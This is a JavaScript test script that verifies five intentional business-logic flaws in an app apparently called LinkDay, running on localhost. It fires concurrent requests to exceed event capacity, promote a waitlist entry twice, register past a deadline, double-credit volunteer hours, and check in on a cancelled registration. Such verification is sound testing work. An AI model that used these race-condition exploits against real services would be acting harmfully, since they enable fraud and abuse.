// test-vuln.js - Verification of 5 Business Logic Flaws for LinkDay (Port 9934)
const PORT = 9934;
const BASE_URL = `http://localhost:${PORT}`;

async function runTests() {
  console.log('🤝 Starting Business Logic Vulnerability Verification for LinkDay (Port 9934)...\n');
  let passed = 0;

  // 1. SEC-361: Capacity Limit Bypass (Concurrent apply on evt-001)
  try {
    const [r1, r2] = await Promise.all([
      fetch(`${BASE_URL}/api/events/evt-001/apply`, { method: 'POST' }).then(r => r.json()),
      fetch(`${BASE_URL}/api/events/evt-001/apply`, { method: 'POST' }).then(r => r.json())
    ]);
    const evtRes = await fetch(`${BASE_URL}/api/events/evt-001`).then(r => r.json());

    if (r1.success && r2.success && evtRes.data.currentParticipants > evtRes.data.capacity) {
      console.log(`✅ [SEC-361] Event Capacity Limit Bypass -> PASSED (Participants: ${evtRes.data.currentParticipants} > Capacity: ${evtRes.data.capacity})`);
      passed++;
    } else {
      console.log(`❌ [SEC-361] FAILED`, { r1, r2, evt: evtRes.data });
    }
  } catch (err) {
    console.log(`❌ [SEC-361] ERROR:`, err.message);
  }

  // 2. SEC-362: Duplicate Waitlist Promotion
  try {
    const [r1, r2] = await Promise.all([
      fetch(`${BASE_URL}/api/events/evt-003/promote-waitlist`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ waitlistId: 'wt-5001' })
      }).then(r => r.json()),
      fetch(`${BASE_URL}/api/events/evt-003/promote-waitlist`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ waitlistId: 'wt-5001' })
      }).then(r => r.json())
    ]);

    if (r1.success && r2.success && r1.data.registration.id !== r2.data.registration.id) {
      console.log(`✅ [SEC-362] Duplicate Waitlist Promotion -> PASSED (2 Registrations created: ${r1.data.registration.id}, ${r2.data.registration.id})`);
      passed++;
    } else {
      console.log(`❌ [SEC-362] FAILED`, { r1, r2 });
    }
  } catch (err) {
    console.log(`❌ [SEC-362] ERROR:`, err.message);
  }

  // 3. SEC-363: Closed Registration Deadline Bypass
  try {
    const res = await fetch(`${BASE_URL}/api/events/evt-004/apply`, { method: 'POST' }).then(r => r.json());
    if (res.success && res.data.registration) {
      console.log(`✅ [SEC-363] Closed Deadline Registration Bypass -> PASSED (Registration: ${res.data.registration.id})`);
      passed++;
    } else {
      console.log(`❌ [SEC-363] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-363] ERROR:`, err.message);
  }

  // 4. SEC-364: Duplicate Volunteer Hours Credit
  try {
    const userBefore = await fetch(`${BASE_URL}/api/auth/me`).then(r => r.json());
    const [r1, r2] = await Promise.all([
      fetch(`${BASE_URL}/api/events/evt-002/attendance`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ registrationId: 'reg-1002', userId: 'usr-001' })
      }).then(r => r.json()),
      fetch(`${BASE_URL}/api/events/evt-002/attendance`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ registrationId: 'reg-1002', userId: 'usr-001' })
      }).then(r => r.json())
    ]);
    const userAfter = await fetch(`${BASE_URL}/api/auth/me`).then(r => r.json());

    if (r1.success && r2.success && userAfter.data.totalVolunteerHours >= userBefore.data.totalVolunteerHours + 8) {
      console.log(`✅ [SEC-364] Duplicate Volunteer Hours Credit -> PASSED (Hours credited twice: +8 hours)`);
      passed++;
    } else {
      console.log(`❌ [SEC-364] FAILED`, { r1, r2, before: userBefore.data.totalVolunteerHours, after: userAfter.data.totalVolunteerHours });
    }
  } catch (err) {
    console.log(`❌ [SEC-364] ERROR:`, err.message);
  }

  // 5. SEC-365: Cancelled Registration Attendance Inconsistency
  try {
    const res = await fetch(`${BASE_URL}/api/events/evt-003/attendance`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ registrationId: 'reg-1003', userId: 'usr-001' })
    }).then(r => r.json());

    if (res.success && res.data.registration.attendanceStatus === 'attended') {
      console.log(`✅ [SEC-365] Cancelled Registration Attendance Inconsistency -> PASSED (Cancelled reg-1003 checked-in)`);
      passed++;
    } else {
      console.log(`❌ [SEC-365] FAILED`, res);
    }
  } catch (err) {
    console.log(`❌ [SEC-365] ERROR:`, err.message);
  }

  console.log(`\n========================================`);
  console.log(`🎉 Test Results: ${passed} / 5 vulnerabilities verified!`);
  console.log(`========================================\n`);
}

runTests();
